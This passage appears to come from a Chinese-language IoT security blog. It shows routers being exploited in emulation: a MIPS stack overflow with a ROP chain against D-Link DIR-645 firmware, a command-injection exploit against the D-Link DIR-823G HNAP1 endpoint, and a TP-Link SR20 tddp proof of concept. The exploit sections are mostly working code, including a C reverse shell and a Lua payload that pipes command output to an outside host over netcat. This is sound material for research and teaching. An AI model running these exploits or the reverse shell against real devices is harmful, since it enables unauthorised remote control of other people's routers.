plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">iot@attifyos ~/f/e/_/squashfs-root&gt; cd var/</span><br><span class="line">iot@attifyos ~/f/e/_/s/var&gt; mkdir run</span><br><span class="line">iot@attifyos ~/f/e/_/s/var&gt; cd run/</span><br><span class="line">iot@attifyos ~/f/e/_/s/v/run&gt; ls</span><br><span class="line">iot@attifyos ~/f/e/_/s/v/run&gt; touch hash</span><br><span class="line">iot@attifyos ~/f/e/_/s/v/run&gt; touch password</span><br></pre></td></tr></table></figure><p>### </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">iot@attifyos ~/f/example1&gt; python pattern.py -c -l 300 -f _dir645_FW_103.bin.extracted/squashfs-root/var/run/<span class="built_in">hash</span> </span><br><span class="line">[*] Create pattern string contains 300 characters ok!</span><br><span class="line">[+] output to _dir645_FW_103.bin.extracted/squashfs-root/var/run/<span class="built_in">hash</span> ok!</span><br><span class="line">[+] take time: 0.0024 s</span><br><span class="line">iot@attifyos ~/f/example1&gt; python pattern.py -c -l 20 -f _dir645_FW_103.bin.extracted/squashfs-root/var/run/password </span><br><span class="line">[*] Create pattern string contains 20 characters ok!</span><br><span class="line">[+] output to _dir645_FW_103.bin.extracted/squashfs-root/var/run/password ok!</span><br><span class="line">[+] take time: 0.0003 s</span><br></pre></td></tr></table></figure><p>先把widget程序跑起来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot . ./qemu-mipsel-static   -g 1234 ./usr/sbin/widget -a var/run/password</span><br></pre></td></tr></table></figure><p>漏洞点在读取<code>var/run/hash</code>文件内容时，没有检查size，造成栈溢出。</p><p><img alt="image-20200710145413268" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200710145413268.png" class="lozad"></p><p><img alt="image-20200710145501082" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200710145501082.png" class="lozad"></p><p><img alt="image-20200710153118887" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200710153118887.png" class="lozad"></p><p>mian函数在结束的时候，会将栈中的函数返回地址赋给 <code>$ra</code>，并将使用过的变量赋给 <code>$s0-$s7</code> <code>$fp</code></p><p><img alt="image-20200710164728734" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200710164728734.png" class="lozad"></p><p><code>$gp</code>用来存放一些用于系统维护的static和extern变量</p><p><img alt="image-20200710161557715" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200710161557715.png" class="lozad"></p><p>在ida里面可以看到在REGINFO这个段内</p><p><img alt="image-20200710161443085" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200710161443085.png" class="lozad"></p><p>可以看到ra寄存器已经被覆盖成 0x62626262</p><p><img alt="image-20200710155627574" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200710155627574.png" class="lozad"></p><p>完整的利用ROP链如下</p><p><img alt="image-20200710162512524" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200710162512524.png" class="lozad"></p><p>程序的劫持流程 <code>jr $a</code> -&gt; <code>jr 0x40854000+0x158c8</code> -&gt; <code>jalr 0x40854000+0x159cc</code> -&gt; <code>jalr system(cmd)</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/40xi 0x40854000+0x158c8</span><br><span class="line">   0x408698c8:movet9,s5</span><br><span class="line">   0x408698cc:jalrt9</span><br><span class="line">   0x408698d0:addius0,s0,1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/40xi 0x40854000+0x159cc</span><br><span class="line">   0x408699cc:addius5,sp,16</span><br><span class="line">   0x408699d0:movea1,s3</span><br><span class="line">   0x408699d4:movea2,s1</span><br><span class="line">   0x408699d8:movet9,s0</span><br><span class="line">   0x408699dc:jalrt9</span><br><span class="line">   0x408699e0:movea0,s5</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/40xi 0x40854000+0x53200</span><br><span class="line">   0x408a7200 &lt;system&gt;:luigp,0x2</span><br><span class="line">   0x408a7204 &lt;system+4&gt;:addiugp,gp,13024</span><br><span class="line">   0x408a7208 &lt;system+8&gt;:addugp,gp,t9</span><br><span class="line">   0x408a720c &lt;system+12&gt;:addiusp,sp,-72</span><br><span class="line">   0x408a7210 &lt;system+16&gt;:swra,68(sp)</span><br><span class="line">   0x408a7214 &lt;system+20&gt;:sws5,64(sp)</span><br><span class="line">   0x408a7218 &lt;system+24&gt;:sws4,60(sp)</span><br><span class="line">   0x408a721c &lt;system+28&gt;:sws3,56(sp)</span><br><span class="line">   0x408a7220 &lt;system+32&gt;:sws2,52(sp)</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc_address=<span class="number">0x40854000</span></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x100</span></span><br><span class="line">payload+=p32(libc_address+<span class="number">0x53200</span><span class="number">-1</span>)<span class="comment"># $s0</span></span><br><span class="line">payload+=<span class="string">'a'</span>*<span class="number">4</span>                      <span class="comment"># $s1</span></span><br><span class="line">payload+=<span class="string">'a'</span>*<span class="number">4</span>                      <span class="comment"># $s2</span></span><br><span class="line">payload+=<span class="string">'a'</span>*<span class="number">4</span>                      <span class="comment"># $s3</span></span><br><span class="line">payload+=<span class="string">'a'</span>*<span class="number">4</span>                      <span class="comment"># $s4</span></span><br><span class="line">payload+=p32(libc_address+<span class="number">0x159cc</span>)  <span class="comment"># $s5 </span></span><br><span class="line">payload+=<span class="string">'a'</span>*<span class="number">4</span>                      <span class="comment"># $s6</span></span><br><span class="line">payload+=<span class="string">'a'</span>*<span class="number">4</span>                      <span class="comment"># $s7</span></span><br><span class="line">payload+=<span class="string">'a'</span>*<span class="number">4</span>                      <span class="comment"># $fp</span></span><br><span class="line">payload+=p32(libc_address+<span class="number">0x158c8</span>)  <span class="comment"># $ra</span></span><br><span class="line">payload+=<span class="string">'a'</span>*<span class="number">0x10</span></span><br><span class="line">payload+=<span class="string">'sh\x00\x00'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"var/run/hash"</span>,<span class="string">"w"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">pwndbg&gt; x/40xi 0x40854000+0x158c8</span></span><br><span class="line"><span class="string">   0x408698c8:  move    t9,s5</span></span><br><span class="line"><span class="string">   0x408698cc:  jalr    t9</span></span><br><span class="line"><span class="string">   0x408698d0:  addiu   s0,s0,1</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">pwndbg&gt; x/40xi 0x40854000+0x159cc</span></span><br><span class="line"><span class="string">   0x408699cc:  addiu   s5,sp,16</span></span><br><span class="line"><span class="string">   0x408699d0:  move    a1,s3</span></span><br><span class="line"><span class="string">   0x408699d4:  move    a2,s1</span></span><br><span class="line"><span class="string">   0x408699d8:  move    t9,s0</span></span><br><span class="line"><span class="string">   0x408699dc:  jalr    t9</span></span><br><span class="line"><span class="string">   0x408699e0:  move    a0,s5</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h3 id="asm-py"><a href="#asm-py" class="headerlink" title="asm.py"></a>asm.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'mips'</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">shellcode=asm(</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">li $v0,0x6e69622f</span></span><br><span class="line"><span class="string">sw $v0,0($sp)</span></span><br><span class="line"><span class="string">li $v0,0x0068732f</span></span><br><span class="line"><span class="string">sw $v0,4($sp)</span></span><br><span class="line"><span class="string">addiu $a0,$sp,0</span></span><br><span class="line"><span class="string">li $v0,4011</span></span><br><span class="line"><span class="string">li $a1,0</span></span><br><span class="line"><span class="string">li $a2,0</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">"""</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(shellcode)):</span><br><span class="line">    payload+=<span class="string">'\\x'</span>+hex(ord(shellcode[i]))[<span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> payload</span><br></pre></td></tr></table></figure><h3 id="start-py-1"><a href="#start-py-1" class="headerlink" title="start.py"></a>start.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># vim:fenc=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">cmd = <span class="string">'# '</span></span><br><span class="line">current_path = os.getcwd()</span><br><span class="line">firware_path=<span class="string">'/home/iot/tools/firmware-analysis-toolkit/firmadyne/vulfirmware/example1/_dir645_FW_103.bin.extracted/'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(r)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'login: '</span>, <span class="string">'root'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Password: '</span>, <span class="string">'root'</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">'ifconfig eth0 192.168.1.1'</span>)</span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    r2=process('sh')</span></span><br><span class="line"><span class="string">    r2.sendline('cd '+firware_path)</span></span><br><span class="line"><span class="string">    r2.sendline('tar -cvf squashfs-root.tar squashfs-root/')</span></span><br><span class="line"><span class="string">    r2.sendline('python -m SimpleHTTPServer 8888')</span></span><br><span class="line"><span class="string">    sleep(2)</span></span><br><span class="line"><span class="string">    r.sendlineafter(cmd, 'wget http://192.168.1.2:8888/squashfs-root.tar')</span></span><br><span class="line"><span class="string">    r.sendlineafter(cmd, 'tar -xvf squashfs-root.tar')</span></span><br><span class="line"><span class="string">    r.sendlineafter(cmd, 'mount -o bind /dev/ ./squashfs-root/dev/')</span></span><br><span class="line"><span class="string">    r.sendlineafter(cmd, 'mount -t proc /proc/ ./squashfs-root/proc/')</span></span><br><span class="line"><span class="string">    r.sendlineafter(cmd, 'chroot ./squashfs-root sh')</span></span><br><span class="line"><span class="string">    r2.close()</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    r.interactive()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    os.system(<span class="string">'sudo tunctl -t tap0 -u iot'</span>)</span><br><span class="line">    os.system(<span class="string">'sudo ifconfig tap0 192.168.1.2/24'</span>)</span><br><span class="line">    exploit(process(<span class="string">'./run.sh'</span>))</span><br></pre></td></tr></table></figure><h3 id="run-sh-1"><a href="#run-sh-1" class="headerlink" title="run.sh"></a>run.sh</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># vim:fenc=utf-8</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="string">'''startvm.sh</span></span><br><span class="line"><span class="string">qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append "root=/dev/sda1 console=tty0" -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">cmd = <span class="string">'$ '</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(r)</span>:</span></span><br><span class="line">    r.sendlineafter(cmd, <span class="string">'stty -echo'</span>)</span><br><span class="line">    os.system(<span class="string">'musl-gcc  -static -O2 exp.c -o exp'</span>)</span><br><span class="line">    os.system(<span class="string">'gzip -c exp &gt; exp.gz'</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">'cat &lt;&lt;EOF &gt; exp.gz.b64'</span>) <span class="comment">#heredoc</span></span><br><span class="line">    r.sendline((read(<span class="string">'exp.gz'</span>)).encode(<span class="string">'base64'</span>))</span><br><span class="line">    r.sendline(<span class="string">'EOF'</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">'base64 -d exp.gz.b64 &gt; exp.gz'</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">'gunzip exp.gz'</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">'chmod +x ./exp'</span>) </span><br><span class="line">    r.interactive()</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">exploit(process(<span class="string">'startvm.sh'</span>))</span><br></pre></td></tr></table></figure><h2 id="D-link-DIR-823G命令执行"><a href="#D-link-DIR-823G命令执行" class="headerlink" title="D-link DIR-823G命令执行"></a>D-link DIR-823G命令执行</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>goahead服务在 请求<code>/HNAP1/</code>页面时 post的数据没有进行过滤，造成了命令注入</p><p><img alt="image-20200714152205064" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200714152205064.png" class="lozad"></p><p><img alt="image-20200714152223040" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200714152223040.png" class="lozad"></p><p><img alt="" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200714153442471.png" class="lozad"></p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"> </span><br><span class="line">IP=<span class="string">'192.168.0.1'</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#出入要执行的命令</span></span><br><span class="line">command = <span class="string">"'`ifconfig &gt; /web_mtn/hack_by_nocbtm.txt`'"</span></span><br><span class="line">length = len(command)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#构造报文的头部</span></span><br><span class="line">headers = requests.utils.default_headers()</span><br><span class="line">headers[<span class="string">"Content-Length"</span>]=str(length)</span><br><span class="line">headers[<span class="string">"User-Agent"</span>] = <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36"</span></span><br><span class="line">headers[<span class="string">"SOAPAction"</span>] = <span class="string">'"http://purenetworks.com/HNAP1/GetClientInfo"'</span></span><br><span class="line">headers[<span class="string">"Content-Type"</span>] = <span class="string">"text/xml; charset=UTF-8"</span></span><br><span class="line">headers[<span class="string">"Accept"</span>]=<span class="string">"*/*"</span></span><br><span class="line">headers[<span class="string">"Accept-Encoding"</span>]=<span class="string">"gzip, deflate"</span></span><br><span class="line">headers[<span class="string">"Accept-Language"</span>]=<span class="string">"zh-CN,zh;q=0.9,en;q=0.8"</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#发送攻击payload</span></span><br><span class="line">payload = command</span><br><span class="line">r = requests.post(<span class="string">'http://'</span>+IP+<span class="string">'/HNAP1/'</span>, headers=headers, data=payload)</span><br></pre></td></tr></table></figure><p><img alt="image-20200714160840955" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200714160840955.png" class="lozad"></p><h3 id="revershell-c"><a href="#revershell-c" class="headerlink" title="revershell.c"></a>revershell.c</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Simple reverse shell revershell.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">daemon(<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">int</span> sock = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">attacker_addr</span> = &#123;</span><span class="number">0</span>&#125;;</span><br><span class="line">attacker_addr.sin_family = AF_INET;</span><br><span class="line">attacker_addr.sin_port = htons(<span class="number">4444</span>);</span><br><span class="line">attacker_addr.sin_addr.s_addr = inet_addr(<span class="string">"192.168.1.2"</span>);</span><br><span class="line"><span class="keyword">if</span>(connect(sock, (struct sockaddr *)&amp;attacker_addr,<span class="keyword">sizeof</span>(attacker_addr))!=<span class="number">0</span>)</span><br><span class="line">_exit(<span class="number">0</span>);</span><br><span class="line">dup2(sock, <span class="number">0</span>);</span><br><span class="line">dup2(sock, <span class="number">1</span>);</span><br><span class="line">dup2(sock, <span class="number">2</span>);</span><br><span class="line">execl(<span class="string">"/bin/sh"</span>, <span class="string">"/bin/sh"</span>, <span class="string">"-i"</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img alt="image-20200714191623780" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200714191623780.png" class="lozad"></p><h2 id="TP-Link-SR20-tddp命令执行"><a href="#TP-Link-SR20-tddp命令执行" class="headerlink" title="TP-Link SR20  tddp命令执行"></a>TP-Link SR20  tddp命令执行</h2><h3 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>tddp服务，在读取文件时，使用了<code>luaL_loadfile</code>加载文件，并且后面<code>lua_pcall</code>了文件里面的内容，没有做一些检查</p><p>文件里面写入 lua函数就可以调用执行。</p><p><img alt="image-20200715190223094" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200715190223094.png" class="lozad"></p><p><img alt="image-20200715194713510" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200715194713510.png" class="lozad"></p><p><img alt="image-20200715194632042" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200715194632042.png" class="lozad"></p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># Copyright 2019 Google LLC.</span></span><br><span class="line"><span class="comment"># SPDX-License-Identifier: Apache-2.0</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># Create a file in your tftp directory with the following contents:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#function config_test(config)</span></span><br><span class="line"><span class="comment">#  os.execute("telnetd -l /bin/login.sh")</span></span><br><span class="line"><span class="comment">#end</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Execute script as poc.py remoteaddr filename</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"> </span><br><span class="line">port_send = <span class="number">1040</span></span><br><span class="line">port_receive = <span class="number">61000</span></span><br><span class="line"> </span><br><span class="line">tddp_ver = <span class="string">"01"</span></span><br><span class="line">tddp_command = <span class="string">"31"</span></span><br><span class="line">tddp_req = <span class="string">"01"</span></span><br><span class="line">tddp_reply = <span class="string">"00"</span></span><br><span class="line">tddp_padding = <span class="string">"%0.16X"</span> % <span class="number">00</span></span><br><span class="line"> </span><br><span class="line">tddp_packet = <span class="string">""</span>.join([tddp_ver, tddp_command, tddp_req, tddp_reply, tddp_padding])</span><br><span class="line"> </span><br><span class="line">sock_receive = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">sock_receive.bind((<span class="string">''</span>, port_receive))</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Send a request</span></span><br><span class="line">sock_send = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">packet = binascii.unhexlify(tddp_packet)</span><br><span class="line">argument = <span class="string">"%s;arbitrary"</span> % sys.argv[<span class="number">2</span>]</span><br><span class="line">packet = packet + argument.encode()</span><br><span class="line">sock_send.sendto(packet, (sys.argv[<span class="number">1</span>], port_send))</span><br><span class="line">sock_send.close()</span><br><span class="line"> </span><br><span class="line">response, addr = sock_receive.recvfrom(<span class="number">1024</span>)</span><br><span class="line">r = response.encode(<span class="string">'hex'</span>)</span><br><span class="line">print(r)</span><br></pre></td></tr></table></figure><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">config_test</span><span class="params">(config)</span></span></span><br><span class="line">  <span class="built_in">os</span>.<span class="built_in">execute</span>(<span class="string">"id | nc 10.10.10.1 1337"</span>)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p><img alt="image-20200715165115729" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200715165115729.png" class="lozad"></p><p>反弹shell</p><p><img alt="image-20200715185253238" data-src="F:\ubuntu_share\iot\分析模板\TP-Link SR20\利用成功截图证明和视频\image-20200715185253238.png" class="lozad"></p><h2 id="UART接口"><a href="#UART接口" class="headerlink" title="UART接口"></a>UART接口</h2><p><img alt="image-20200720142830325" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200720142830325.png" class="lozad"></p><p><img alt="image-20200720142757253" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200720142757253.png" class="lozad"></p><h3 id="接口调试工具"><a href="#接口调试工具" class="headerlink" title="接口调试工具"></a>接口调试工具</h3><p><img alt="image-20200720143039864" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200720143039864.png" class="lozad"></p><h3 id="波特率"><a 